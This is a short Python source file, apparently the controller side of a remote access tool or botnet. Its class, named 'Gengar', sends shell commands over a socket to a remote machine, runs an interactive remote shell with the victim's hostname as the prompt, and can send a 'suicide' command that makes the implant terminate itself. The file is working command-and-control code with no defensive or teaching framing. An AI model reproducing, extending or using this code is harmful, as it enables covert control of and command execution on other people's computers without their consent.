class Gengar:
    def __init__(self, sock):
        self._sock = sock

    def _send(self, data):
        self._sock.send(data.encode())

    def _recv(self, buff_size):
        return self._sock.recv(buff_size).decode().strip()

    def shell(self, cmd):
        self._send(f'shell:{cmd}')
        return self._recv(4096)

    def suicide(self):
        self._send('action:suicide')
        self._sock.close()

    def hostname(self):
        return self.shell('hostname')

    def interactive_shell(self):
        while True:
            shell_cmd = input(f'{self.hostname()}$ ')
            if shell_cmd == 'exit':
                print('Exiting')
                break
            print(self.shell(shell_cmd))

    def __repr__(self):
        ip, port = self._sock.getpeername()
        return f'Gengar at {ip}'
